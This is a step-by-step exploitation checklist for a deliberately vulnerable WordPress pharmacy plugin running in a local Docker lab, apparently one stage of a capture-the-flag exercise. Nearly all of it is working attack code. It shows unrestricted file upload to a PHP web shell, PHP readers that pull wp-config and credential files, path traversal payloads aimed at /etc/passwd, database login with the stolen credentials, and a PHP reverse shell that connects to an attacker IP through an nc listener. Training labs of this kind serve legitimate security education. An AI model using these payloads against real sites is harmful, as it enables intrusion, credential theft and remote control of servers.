# Stage 4 Testing Checklist - Test It Yourself

## ✅ Pre-Test Verification

Before attempting exploitation, verify everything is running:

```bash
# Check Docker containers
docker-compose ps

# Should show:
# - pharmacy-db (mysql) ✓ UP
# - pharmacy-wordpress (wordpress) ✓ UP

# Check WordPress is accessible
curl -s http://localhost/ | grep -i "pharmacy" | head -3

# Check AJAX endpoints are accessible
curl -s http://localhost/wp-admin/admin-ajax.php?action=pharmacy_get_inventory 2>&1 | head -3
```

---

## 🧪 TEST PLAN

### Test 1: Verify AJAX Endpoints ⭐ START HERE

**Objective:** Confirm vulnerable endpoints are active

```bash
echo "=== TEST 1: AJAX Endpoints ==="

echo "1a. Testing pharmacy_get_inventory..."
curl -s -X POST -d "medicine_id=aspirin" \
  http://localhost/wp-admin/admin-ajax.php?action=pharmacy_get_inventory

echo -e "\n1b. Testing pharmacy_export..."
curl -s -X POST \
  http://localhost/wp-admin/admin-ajax.php?action=pharmacy_export

echo -e "\n1c. Testing pharmacy_sync..."
curl -s -X POST -d "sync_data=test" \
  http://localhost/wp-admin/admin-ajax.php?action=pharmacy_sync

echo -e "\n✓ All endpoints responding!"
```

**Expected Results:**
- ✅ medicine_id returns JSON with inventory
- ✅ pharmacy_export returns error (no file provided is OK)
- ✅ pharmacy_sync returns error or success message

---

### Test 2: File Upload Vulnerability ⭐⭐ MOST PRACTICAL

**Objective:** Upload and execute a PHP file

**Step 2.1:** Create a simple test file
```bash
echo "TEST_CONTENT" > /tmp/test.txt
```

**Step 2.2:** Upload it
```bash
RESPONSE=$(curl -s -F "export_file=@/tmp/test.txt" \
  http://localhost/wp-admin/admin-ajax.php?action=pharmacy_export)

echo "Upload response:"
echo $RESPONSE
```

**Expected:** 
```json
{"success":true,"data":{"url":"http://localhost/wp-content/uploads/pharmacy/test.txt"}}
```

**Step 2.3:** Download and verify
```bash
# Extract the URL
URL=$(echo $RESPONSE | grep -o 'http://localhost[^"]*')
echo "Accessing: $URL"
curl -s "$URL"
```

**Expected:** Should show "TEST_CONTENT"

---

### Test 3: PHP Code Execution ⭐⭐⭐ MAIN TEST

**Objective:** Execute PHP and read system information

**Step 3.1:** Create PHP shell
```bash
cat > /tmp/shell.txt << 'EOF'
<?php
echo "=== PHP SHELL EXECUTED ===\n";
echo "Current User: " . get_current_user_id() . "\n";
echo "Server Info: " . php_uname() . "\n";
echo "Current Directory: " . getcwd() . "\n";
echo "\nDirectory listing:\n";
system('ls -la /var/www/html/wp-content/ | head -20');
?>
EOF
```

**Step 3.2:** Upload the shell
```bash
SHELL_RESPONSE=$(curl -s -F "export_file=@/tmp/shell.txt" \
  http://localhost/wp-admin/admin-ajax.php?action=pharmacy_export)

SHELL_URL=$(echo $SHELL_RESPONSE | grep -o 'http://localhost[^"]*')
echo "Shell URL: $SHELL_URL"
```

**Step 3.3:** Execute the shell
```bash
curl -s "$SHELL_URL"
```

**Expected Output:**
```
=== PHP SHELL EXECUTED ===
Current User: [number]
Server Info: Linux pharmacy-wordpress ...
Current Directory: /var/www/html
Directory listing:
...
```

✅ **If you see this, you have PHP Code Execution!**

---

### Test 4: Read WordPress Configuration ⭐⭐⭐⭐

**Objective:** Extract database and config information

**Step 4.1:** Create config reader
```bash
cat > /tmp/readconfig.txt << 'EOF'
<?php
$config_file = '/var/www/html/wp-config.php';
$lines = file($config_file);

echo "<h2>WordPress Configuration</h2>";
echo "<pre>";
foreach ($lines as $line) {
    if (strpos($line, 'DB_') !== false || strpos($line, 'define(') !== false) {
        echo htmlspecialchars($line);
    }
}
echo "</pre>";
?>
EOF
```

**Step 4.2:** Upload and execute
```bash
CONFIG_URL=$(curl -s -F "export_file=@/tmp/readconfig.txt" \
  http://localhost/wp-admin/admin-ajax.php?action=pharmacy_export | \
  grep -o 'http://localhost[^"]*')

curl -s "$CONFIG_URL" | grep -i "define\|database"
```

**Expected:** Should see database credentials like:
```
define('DB_NAME', 'wordpress');
define('DB_USER', 'wp_user');
define('DB_PASSWORD', 'wp_password_123');
```

✅ **If you see database credentials, you can now access the database!**

---

### Test 5: Extract Stage 5 Credentials ⭐⭐⭐⭐⭐ MAIN GOAL

**Objective:** Read the hidden credentials file

**Step 5.1:** Create credentials extractor
```bash
cat > /tmp/getcreds.txt << 'EOF'
<?php
echo "<h1>STAGE 5 CREDENTIALS</h1>";
echo "<pre>";

$cred_file = '/var/www/html/wp-content/pharmacy_config.php';
$backup_file = '/var/www/html/wp-content/backup_creds.txt';

if (file_exists($cred_file)) {
    echo "=== pharmacy_config.php ===\n";
    echo file_get_contents($cred_file);
} else {
    echo "pharmacy_config.php not found\n";
}

echo "\n\n=== backup_creds.txt ===\n";
if (file_exists($backup_file)) {
    echo file_get_contents($backup_file);
}

echo "</pre>";
?>
EOF
```

**Step 5.2:** Upload and execute
```bash
CRED_URL=$(curl -s -F "export_file=@/tmp/getcreds.txt" \
  http://localhost/wp-admin/admin-ajax.php?action=pharmacy_export | \
  grep -o 'http://localhost[^"]*')

echo "Accessing: $CRED_URL"
curl -s "$CRED_URL"
```

**Expected Output:**
```
=== STAGE 5 CREDENTIALS ===

define('STAGE5_SSH_HOST', 'stage5.internal.pharmacy.local');
define('STAGE5_SSH_USER', 'pharmacy_admin');
define('STAGE5_SSH_PASS', 'PharmacyPass_2025!Secure');
define('STAGE5_DB_HOST', 'pharmacy-db');
define('STAGE5_DB_USER', 'db_admin');
define('STAGE5_DB_PASS', 'DatabaseAdmin@2025');
```

✅ **SUCCESS! You've extracted Stage 5 credentials!**

---

### Test 6: Information Disclosure via AJAX ⭐⭐

**Objective:** Test the pharmacy_get_inventory info leak

**Step 6.1:** Basic info disclosure
```bash
echo "=== Testing pharmacy_get_inventory ==="

for id in "aspirin" "ibuprofen" "test123"; do
    echo -e "\nMedicine ID: $id"
    curl -s -X POST -d "medicine_id=$id" \
      http://localhost/wp-admin/admin-ajax.php?action=pharmacy_get_inventory
done
```

**Expected:** Each returns inventory info with hint about wp-config.php

**Step 6.2:** Test path traversal (advanced)
```bash
echo "=== Testing Path Traversal ==="

# Try to access parent directory
curl -s -X POST -d "medicine_id=../wp-config" \
  http://localhost/wp-admin/admin-ajax.php?action=pharmacy_get_inventory

# Try to access system files
curl -s -X POST -d "medicine_id=../../../../etc/passwd" \
  http://localhost/wp-admin/admin-ajax.php?action=pharmacy_get_inventory
```

---

### Test 7: Database Access (Using Extracted Creds)

**Objective:** Connect to database with extracted credentials

**Step 7.1:** Connect to database
```bash
# Use credentials from Test 5
mysql -h localhost -u wp_user -p'wp_password_123' wordpress
```

**Step 7.2:** Inside MySQL, run:
```sql
-- Check WordPress users
SELECT user_login, user_email FROM wp_users;

-- Check for hidden options
SELECT option_name, option_value FROM wp_options 
WHERE option_name LIKE '%pharmacy%' OR option_name LIKE '%stage%';

-- Check posts for hints
SELECT post_title, post_excerpt FROM wp_posts 
WHERE post_type='post' AND post_status='publish';
```

---

### Test 8: Reverse Shell (Advanced) ⭐⭐⭐⭐⭐

**Objective:** Get interactive terminal access

**Step 8.1:** Create reverse shell
```bash
# Your attacker IP (run on your machine)
ATTACKER_IP=$(hostname -I | awk '{print $1}')
ATTACKER_PORT=4444

# Set up listener (in another terminal)
nc -lvnp 4444

# Create PHP reverse shell
cat > /tmp/revshell.txt << 'EOF'
<?php
$sock=fsockopen("ATTACKER_IP",ATTACKER_PORT);
$proc=proc_open("/bin/sh",array(0=>$sock,1=>$sock,2=>$sock),$pipes);
?>
EOF

# Replace ATTACKER_IP with your actual IP
sed -i "s/ATTACKER_IP/$ATTACKER_IP/g" /tmp/revshell.txt
sed -i "s/ATTACKER_PORT/$ATTACKER_PORT/g" /tmp/revshell.txt
```

**Step 8.2:** Upload and trigger
```bash
REV_URL=$(curl -s -F "export_file=@/tmp/revshell.txt" \
  http://localhost/wp-admin/admin-ajax.php?action=pharmacy_export | \
  grep -o 'http://localhost[^"]*')

curl "$REV_URL"
```

**Expected:** Shell connection in your netcat listener

---

## 📋 Testing Workflow

```
START
  │
  ├─→ Test 1: Verify Endpoints (2 min) ✓
  │     └─ If FAIL: Check Docker containers
  │
  ├─→ Test 2: File Upload (3 min) ✓
  │     └─ If FAIL: Check permissions /wp-content/uploads
  │
  ├─→ Test 3: PHP Execution (5 min) ✓
  │     └─ If FAIL: Check if PHP is executing
  │
  ├─→ Test 4: Read Config (3 min) ✓
  │     └─ If FAIL: File might not exist
  │
  ├─→ Test 5: Extract Credentials (3 min) ✓
  │     └─ SUCCESS! Stage 5 credentials found
  │
  ├─→ Test 6: Info Disclosure (5 min) ✓
  │     └─ Additional exploitation method
  │
  ├─→ Test 7: Database Access (5 min) ✓
  │     └─ Verify extracted credentials work
  │
  └─→ EXPLOITATION COMPLETE ✅
        Ready for Stage 5!
```

---

## 🔧 Troubleshooting

| Problem | Solution |
|---------|----------|
| Endpoint returns 404 | Restart WordPress: `docker restart pharmacy-wordpress` |
| Upload fails | Check file permissions: `docker exec pharmacy-wordpress chmod 777 /var/www/html/wp-content/uploads` |
| PHP not executing | Check if PHP execution is enabled in web server config |
| Can't read files | Ensure WordPress user (www-data) has read permissions |
| Credentials file not found | Run: `docker exec pharmacy-wordpress ls -la /var/www/html/wp-content/ \| grep pharmacy` |
| MySQL connection fails | Verify password: `docker-compose ps` then check DB_PASSWORD in wp-config |

---

## ✅ Final Checklist

- [ ] Test 1: AJAX endpoints responding
- [ ] Test 2: File upload successful
- [ ] Test 3: PHP code executed
- [ ] Test 4: WordPress config read
- [ ] Test 5: Stage 5 credentials extracted
- [ ] Test 6: Info disclosure working
- [ ] Test 7: Database login successful
- [ ] Credentials verified:
  - [ ] STAGE5_SSH_HOST found
  - [ ] STAGE5_SSH_USER found
  - [ ] STAGE5_SSH_PASS found

**If all checked:** 🎉 **You've successfully exploited Stage 4!**

---

## 📊 Expected Times

- Quick test (Tests 1-3): **10 minutes**
- Full exploitation (Tests 1-5): **20 minutes**
- Database access included (Tests 1-7): **30 minutes**
- Reverse shell included (all): **45 minutes**

**Start with Test 1 and work your way down!** 🚀
